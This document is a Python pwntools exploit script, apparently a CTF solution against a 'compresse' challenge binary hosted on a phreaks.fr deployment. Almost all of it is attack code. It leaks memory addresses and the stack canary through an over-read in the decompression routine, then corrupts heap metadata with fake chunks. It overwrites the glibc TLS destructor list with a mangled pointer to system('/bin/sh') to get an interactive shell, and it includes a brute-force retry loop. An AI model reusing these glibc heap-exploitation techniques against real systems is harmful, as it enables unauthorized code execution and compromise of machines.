from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess
from itertools import *
from more_itertools import *

file = 'compresse'
exe_args = []
PREFIX = (b": ", b"> ")
speed = 0.2

io: process = None

def debug(pid=io):
    gdb.attach(pid, gdbscript=
    """
    
    """, exe=file)
    input("debug")

def launch_remote():
    global file, io
    host = args.HOST if args.HOST else 'compress-501a467eca2b0657.deploy.phreaks.fr'
    port = args.PORT if args.PORT else 443
    io = remote(host, port, ssl=1)

def launch_docker():
    global file, io
    io = remote("localhost", 1337)
    if args.GDB:
        out = subprocess.run(["pgrep", "--newest", "run"], capture_output=True)
        debug(int(out.stdout))

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug(io)

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rol(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: ror(addr, 17) ^ cookie
ptr_getcookie = lambda mangled, demangled: ptr_demangle(mangled, demangled)
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
slaprefix = lambda a: sla(PREFIX, a)
saprefix = lambda a: sa(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def printx(**kwargs):
    for k, v in kwargs.items():
        success("%s: %#x" % (k, v))

def launch():
    if args.REMOTE:
        l = launch_remote
    elif args.DOCKER:
        l = launch_docker
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]
def getr(d, p):
    return re.findall(p, d)[0]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = exe.libc
context.binary = exe

tries = 0

def exploit():
    def decompress(data):
        if type(data) == str:
            data = data.encode()
        choice(1)
        saprefix(data)
        sleep(speed)
        recvu(b"Flated: ")
        return recvu(b"\n\nMenu:", True)
    def compress(data):
        choice(2)
        saprefix(data)
        sleep(speed)
    def alloc(data):
        choice(3)
        saprefix(data)
        sleep(speed)
    def edit(data):
        choice(4)
        saprefix(data)
        sleep(speed)
    def free():
        choice(5)
    def show():
        choice(6)
    def select(idx):
        choice(7)
        choice(idx)
    def quit():
        choice(8)

    leak = decompress(f"{0x48}a999999b")
    exe.address = u64(leak[-6:]) - 0x21d8
    leak = decompress(f"{0x50}a999999b")
    stack = u64(leak[-6:])
    leak = decompress(f"{0x58}a999999b")
    libc.address = u64(leak[-6:]) - 0x851be
    leak = decompress(f"{0xf9}a999999b")
    canary = u64(b"\0" + leak[-7:])
    leak = decompress(f"{0x150}a999999b")
    heap = u64(leak[-6:])
    printx(exe=exe.address, stack=stack, libc=libc.address, heap=heap, canary=canary)

    alloc(b"A"*0x10)
    alloc(b"B"*0x10)
    
    select(0)
    decompress(f"{0x200}a\0")
    chunks = exe.address + 0x4040
    payload = flat([
        b"\0"*0xa0,
        0,
        0x421,
        0,
        0x411,
        chunks - 3*8,
        chunks - 2*8,
    ])
    edit(payload)

    select(1)
    decompress(f"{0x200}a\0")
    payload = flat([
        b"\0"*0xc0, 
        0x410,
        0x420,
        b"C"*0x10,
    ])
    edit(payload)

    select(1)
    free()

    tls = libc.address - 0x28c0

    select(0)
    payload = flat([
        0,
        0,
        0,
        tls-0x50,
        0,
        0,
        0,
        1,
        ptr_mangle(libc.sym.system),
        binsh(),
    ])
    edit(payload)

    select(0)
    payload = flat([ #Â try to keep a clean tls (idk if its useful tho)
        chunks + 0x28,
        0,
        (heap & ~0xfff) + 0x10, # tcache perthread struct
        0,
        libc.sym.main_arena,
        0,
        0,
        0,
        0,
        0,
        tls,
        0,
        tls,
        0,
        0,
        canary,
        0,
    ])
    edit(payload)

    quit()

    io.interactive()
    exit()

if not args.BF:
    launch()
    exploit()
    exit()
else:
    tries_prog = log.progress("Tries")
    while True:
        tries += 1
        tries_prog.status(str(tries))

        launch()
        try:
            exploit()
        except EOFError:
            pass

        with context.local(log_level=logging.ERROR):
            io.close()
